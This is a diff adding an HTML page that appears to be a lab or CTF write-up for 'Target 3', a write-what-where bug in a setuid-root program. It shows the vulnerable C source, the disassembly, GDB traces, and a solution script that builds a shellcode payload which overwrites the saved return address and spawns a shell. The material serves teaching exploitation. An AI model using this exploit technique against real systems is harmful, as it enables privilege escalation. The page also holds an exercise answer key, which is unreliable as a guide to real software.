@@ -1,0 +1,287 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Target 3 — Write-What-Where</title>
+<style>
+  :root {
+    --ink:#17202b; --muted:#5b6879; --bg:#f3f6fa; --card:#fff; --line:#d9e1eb;
+    --red:#b42318; --red-bg:#fef3f2; --green:#13713d; --green-bg:#ecfdf3;
+    --blue:#1d5fa7; --blue-bg:#eff6ff; --amber:#8a5a00; --amber-bg:#fffaeb;
+    --purple:#6941c6; --purple-bg:#f4f0ff;
+    --code-bg:#101823; --code-ink:#dce7f4; --code-muted:#8b9db2;
+    --mono:"Cascadia Code",Consolas,"SFMono-Regular","Liberation Mono",monospace;
+  }
+  * { box-sizing:border-box; }
+  html { scroll-behavior:smooth; }
+  body {
+    margin:0; color:var(--ink);
+    background:
+      radial-gradient(circle at 10% 0%, #e2ecff 0, transparent 32rem),
+      radial-gradient(circle at 92% 16%, #e7f8ef 0, transparent 28rem),
+      var(--bg);
+    font-family:"Segoe UI",system-ui,-apple-system,sans-serif; line-height:1.62;
+  }
+  a { color:var(--blue); }
+  code, pre { font-family:var(--mono); }
+  .wrap { width:min(1180px,calc(100% - 32px)); margin:0 auto; }
+
+  header.hero {
+    color:#f8fbff;
+    background:
+      radial-gradient(circle at 82% 12%, rgba(80,151,255,.28) 0, transparent 25rem),
+      radial-gradient(circle at 14% 84%, rgba(72,211,146,.14) 0, transparent 20rem),
+      linear-gradient(135deg,#101823 0%,#182a3e 54%,#14332b 100%);
+    border-bottom:1px solid #0a1017; padding:62px 0 46px;
+  }
+  .eyebrow { color:#7de0a8; text-transform:uppercase; letter-spacing:.17em; font-size:.74rem; font-weight:800; margin-bottom:14px; }
+  h1 { max-width:1000px; margin:0; font-size:clamp(2.1rem,5vw,4rem); line-height:1.04; letter-spacing:-.035em; }
+  .lede { max-width:900px; color:#bdcad9; font-size:1.08rem; margin:22px 0 26px; }
+  .badges { display:flex; flex-wrap:wrap; gap:9px; }
+  .badge { display:inline-flex; gap:7px; align-items:center; padding:7px 11px; border:1px solid rgba(255,255,255,.16); border-radius:999px; background:rgba(255,255,255,.06); color:#e8eff8; font-size:.75rem; font-weight:700; letter-spacing:.03em; }
+  .badge .dot { width:7px; height:7px; border-radius:50%; background:#7de0a8; }
+  .badge.blue .dot { background:#84bdff; }
+  .badge.amber .dot { background:#ffc266; }
+
+  main { padding:38px 0 80px; }
+  section { margin:54px 0; scroll-margin-top:18px; }
+  h2 { font-size:clamp(1.5rem,3vw,2.1rem); line-height:1.16; letter-spacing:-.025em; margin:0 0 8px; }
+  h2 .num { display:inline-grid; place-items:center; vertical-align:4px; width:34px; height:34px; margin-right:8px; border-radius:10px; background:#18283b; color:#fff; font-size:.94rem; letter-spacing:0; }
+  h3 { font-size:1.12rem; margin:26px 0 8px; }
+  p { margin:10px 0; }
+  .section-intro { color:var(--muted); max-width:930px; margin-bottom:20px; }
+
+  .toc { background:var(--card); border:1px solid var(--line); border-radius:16px; padding:18px 22px; margin-bottom:38px; box-shadow:0 8px 24px rgba(22,34,51,.05); }
+  .toc strong { display:block; font-size:.76rem; letter-spacing:.12em; text-transform:uppercase; color:var(--muted); margin-bottom:9px; }
+  .toc ol { margin:0; padding-left:20px; columns:2; column-gap:36px; }
+  .toc li { margin:5px 0; break-inside:avoid; }
+
+  .card { background:var(--card); border:1px solid var(--line); border-radius:16px; padding:22px; box-shadow:0 8px 24px rgba(22,34,51,.045); }
+  .grid { display:grid; gap:16px; }
+  .grid.two { grid-template-columns:repeat(2,minmax(0,1fr)); }
+  .grid.three { grid-template-columns:repeat(3,minmax(0,1fr)); }
+  .stat { padding:18px 20px; }
+  .stat .label { color:var(--muted); font-size:.71rem; text-transform:uppercase; letter-spacing:.11em; font-weight:800; }
+  .stat .value { font-family:var(--mono); font-size:1.08rem; font-weight:800; margin-top:6px; word-break:break-word; }
+  .stat .hint { color:var(--muted); font-size:.84rem; margin-top:3px; }
+
+  .callout { border-radius:14px; padding:16px 18px; margin:18px 0; border:1px solid; }
+  .callout strong:first-child { display:block; margin-bottom:3px; }
+  .callout.danger { background:var(--red-bg); border-color:#f5c7c2; color:#68130d; }
+  .callout.success { background:var(--green-bg); border-color:#b7ebc9; color:#0b5130; }
+  .callout.info { background:var(--blue-bg); border-color:#c7ddf8; color:#123f72; }
+  .callout.warn { background:var(--amber-bg); border-color:#f2d28a; color:#664000; }
+  .callout.purple { background:var(--purple-bg); border-color:#d9ccff; color:#3f2a83; }
+
+  .file-label { display:inline-block; margin:18px 0 -8px; padding:5px 10px; border-radius:8px 8px 0 0; background:#1b2a3d; color:#bdd0e5; font-family:var(--mono); font-size:.72rem; border:1px solid #2b3d53; border-bottom:0; }
+  .file-label + pre { margin-top:0; border-top-left-radius:0; }
+  pre { margin:16px 0; padding:18px 20px; border-radius:14px; background:var(--code-bg); color:var(--code-ink); font-size:.81rem; line-height:1.55; overflow-x:auto; border:1px solid #263649; box-shadow:inset 0 1px 0 rgba(255,255,255,.04); }
+  pre .c { color:var(--code-muted); }
+  pre .g { color:#7be0a3; }
+  pre .r { color:#ff8d84; }
+  pre .y { color:#ffd166; }
+  pre .b { color:#8ec5ff; }
+  pre .p { color:#c7a7ff; }
+
+  .table-wrap { overflow-x:auto; margin:16px 0; border:1px solid var(--line); border-radius:14px; background:#fff; }
+  table { width:100%; border-collapse:collapse; font-size:.86rem; }
+  th,td { text-align:left; padding:10px 13px; border-bottom:1px solid #e9eef5; vertical-align:top; }
+  th { background:#f7f9fc; color:#455367; font-size:.71rem; text-transform:uppercase; letter-spacing:.08em; }
+  tr:last-child td { border-bottom:0; }
+  td.mono, th.mono { font-family:var(--mono); }
+  .pill { display:inline-block; padding:2px 8px; border-radius:999px; font-size:.72rem; font-weight:800; white-space:nowrap; background:#e8edf5; color:#344257; }
+  .pill.red { background:var(--red-bg); color:var(--red); }
+  .pill.green { background:var(--green-bg); color:var(--green); }
+  .pill.blue { background:var(--blue-bg); color:var(--blue); }
+  .pill.amber { background:var(--amber-bg); color:var(--amber); }
+
+  .target-head { display:flex; justify-content:space-between; align-items:end; gap:18px; flex-wrap:wrap; margin-bottom:8px; }
+  .target-head .tag { color:var(--muted); font-family:var(--mono); font-size:.8rem; }
+  .target-banner { border-radius:14px; padding:14px 18px; margin:18px 0; background:#18283b; color:#dce7f4; border:1px solid #0f1925; }
+  .target-banner strong { color:#7de0a3; }
+  .target-banner code { color:#ffd166; }
+
+  ul,ol { padding-left:24px; }
+  li { margin:5px 0; }
+  .small { font-size:.83rem; color:var(--muted); }
+  footer { border-top:1px solid var(--line); padding:26px 0 0; color:var(--muted); font-size:.84rem; }
+
+  @media (max-width:900px) {
+    .grid.two,.grid.three { grid-template-columns:1fr; }
+    .toc ol { columns:1; }
+  }
+</style>
+<style>
+  body { overflow:auto; }
+  .backbar { padding-top:20px; }
+  .backbar a { font-size:.85rem; font-weight:700; }
+</style>
+<link rel="stylesheet" href="stack-anim.css">
+</head>
+<body>
+<div class="wrap backbar">
+  <a href="index.html#target3" target="_top">← Back to all targets</a>
+</div>
+<main class="wrap" style="padding-top:10px;padding-bottom:60px">
+<section id="stack-animation" style="margin-top:24px">
+  <div class="stack-anim" data-target="t3"></div>
+</section>
+
+<section id="target3">
+    <div class="target-head">
+      <h2><span class="num">3</span>Target 3 — write-what-where</h2>
+      <span class="tag">argv · strncpy · *p = a · setuid root</span>
+    </div>
+    <p class="section-intro">
+      Target 3 does not overflow all the way to the saved return address. Instead,
+      <code>strncpy</code> copies exactly 8 bytes past a 2048-byte buffer, overwriting two
+      local variables: <code>a</code> and <code>p</code>. The next line,
+      <code>*p = a</code>, then performs an attacker-controlled 4-byte write.
+    </p>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">target3.c</h3>
+        <pre style="margin-bottom:0">void vulnerable(char *arg)
+{
+    int *p;
+    int a;
+    char buf[2048];
+
+    strncpy(buf, arg, sizeof(buf) + 8);  <span class="c">// 2056 bytes!</span>
+
+    *p = a;                              <span class="c">// write a to *p</span>
+}</pre>
+      </div>
+      <div class="card">
+        <h3 style="margin-top:0">Key assembly</h3>
+        <pre style="margin-bottom:0">0804a035 &lt;vulnerable&gt;:
+ push ebp
+ mov  ebp,esp
+ push ebx
+ sub  esp,0x814              <span class="c">; 2048-byte buffer + locals</span>
+ ...
+ 804a04c: push 0x808         <span class="c">; sizeof(buf)+8 = 2056</span>
+ 804a051: push [ebp+8]       <span class="c">; arg</span>
+ <span class="y">804a054: lea edx,[ebp-0x810]</span>  <span class="c">; &amp;buf</span>
+ 804a05a: push edx
+ 804a05d: call strncpy
+ ...
+ <span class="g">804a065: mov eax,[ebp-0xc]  ; p</span>
+ <span class="g">804a068: mov edx,[ebp-0x10] ; a</span>
+ <span class="g">804a06b: mov [eax],edx      ; *p = a</span>
+ ...
+ 804a071: leave
+ 804a072: ret</pre>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <strong>The 8 extra bytes</strong>
+      <code>buf</code> occupies <code>EBP-0x810</code> through <code>EBP-0x11</code>.
+      The two locals are directly above it: <code>a</code> at <code>EBP-0x10</code> and
+      <code>p</code> at <code>EBP-0xc</code>. Copying 2056 bytes instead of 2048 writes
+      exactly those 8 bytes. The saved return address at <code>EBP+4</code> is untouched
+      for now.
+    </div>
+
+    <h3>GDB evidence — overwrite a and p, then write through p</h3>
+    <div class="file-label">gdb_target3.txt</div>
+    <pre><span class="b">[1] target3: vulnerable() before strncpy</span>
+<span class="g">EBP = 0xfff6ba48   ESP = 0xfff6b220</span>
+<span class="y">BUF = EBP-0x810 = 0xfff6b238</span>
+<span class="y">a   = EBP-0x10  = 0xfff6ba38</span>
+<span class="y">p   = EBP-0xc   = 0xfff6ba3c</span>
+saved EIP slot = EBP+4 = 0xfff6ba4c
+<span class="r">original saved EIP = 0x0804a0c0</span>
+$1 = 0xfff6b238
+$2 = 0xfff6ba38
+$3 = 0xfff6ba3c
+
+<span class="b">[2] target3: AFTER strncpy (2056 bytes)</span>
+BUF = 0xfff6b238
+<span class="g">a = [EBP-0x10] = 0xfff6b238</span>   <span class="c"># shellcode address</span>
+<span class="g">p = [EBP-0xc]  = 0xfff6ba4c</span>   <span class="c"># saved EIP slot</span>
+saved EIP is still 0x0804a0c0
+first 32 bytes at BUF (shellcode):
+0xfff6b238: 31 db 8d 43 17 99 cd 80
+...
+the 8 bytes after buf: a then p
+0xfff6ba38: <span class="g">0xfff6b238</span> <span class="g">0xfff6ba4c</span> 0x00000000 0x080e8000
+
+<span class="b">[3] target3: just before '*p = a'</span>
+<span class="g">EAX = p = 0xfff6ba4c</span>
+<span class="g">EDX = a = 0xfff6b238</span>
+0xfff6ba4c: 0x0804a0c0 0xfffeb240 0x00000000 0x00000000
+
+<span class="b">[4] target3: AFTER '*p = a'</span>
+<span class="r">saved EIP slot 0xfff6ba4c now contains 0xfff6b238</span>
+
+<span class="b">[5] target3: vulnerable() ret</span>
+ESP = 0xfff6ba4c
+<span class="g">ret will pop = 0xfff6b238</span>
+first instruction at target:
+   0xfff6b238: xor ebx,ebx
+process ... is executing new program: /usr/bin/dash</pre>
+
+    <h3>sol3.py, line by line</h3>
+    <div class="file-label">sol3.py</div>
+    <pre>from shellcode import shellcode
+import sys
+
+payload = shellcode
+
+padding_length = 2048 - len(shellcode)  <span class="c"># fill buf[0..2047]</span>
+payload += b"A" * padding_length
+
+a = (0xfff6b238).to_bytes(4, "little")  <span class="c"># value written by *p = a</span>
+payload += a
+
+p = (0xfff6ba4c).to_bytes(4, "little")  <span class="c"># address written to</span>
+payload += p
+
+sys.stdout.buffer.write(payload)</pre>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Line</th><th>Why it is correct</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">payload = shellcode</td><td>Shellcode starts at <code>BUF=0xfff6b238</code>.</td></tr>
+          <tr><td class="mono">padding_length = 2048 - len(shellcode)</td><td>Fills the entire declared 2048-byte array.</td></tr>
+          <tr><td class="mono">a = 0xfff6b238</td><td>The value that will be written. It is the shellcode's address.</td></tr>
+          <tr><td class="mono">p = 0xfff6ba4c</td><td>The destination. It is the saved-EIP slot of <code>vulnerable()</code>.</td></tr>
+          <tr><td class="mono">write(payload)</td><td>Copied by <code>strncpy</code>; the last 8 bytes land on <code>a</code> and <code>p</code>.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout success">
+      <strong>Why the order is a then p</strong>
+      The stack layout is <code>buf[2048]</code>, then <code>a</code> at
+      <code>EBP-0x10</code>, then <code>p</code> at <code>EBP-0xc</code>. Copying past the
+      buffer writes the first 4 extra bytes into <code>a</code> and the next 4 into
+      <code>p</code>. After that, the program executes <code>mov eax,[EBP-0xc]</code>
+      (load p), <code>mov edx,[EBP-0x10]</code> (load a), and
+      <code>mov [eax],edx</code> (write a to *p). The saved EIP becomes the shellcode
+      address, and <code>ret</code> jumps to it.
+    </div>
+
+    <div class="callout warn">
+      <strong>This is not a normal return-address overflow</strong>
+      The payload does not directly overwrite <code>EBP+4</code>. It abuses the programming
+      bug <code>*p = a</code>, where both <code>p</code> and <code>a</code> are
+      uninitialized locals that the overflow controls. That is why the exploit works even
+      though <code>strncpy</code> stops 8 bytes past the buffer.
+    </div>
+
+    <p class="small">
+      Raw evidence: <a href="gdb_target3.txt">gdb_target3.txt</a> ·
+      disassembly: <a href="target3_disasm.txt">target3_disasm.txt</a> ·
+      source: <a href="target3.c">target3.c</a> · solution: <a href="sol3.py">sol3.py</a>
+    </p>
+  </section>
+</main>
+<script src="stack-anim.js"></script>
+</body>
+</html>
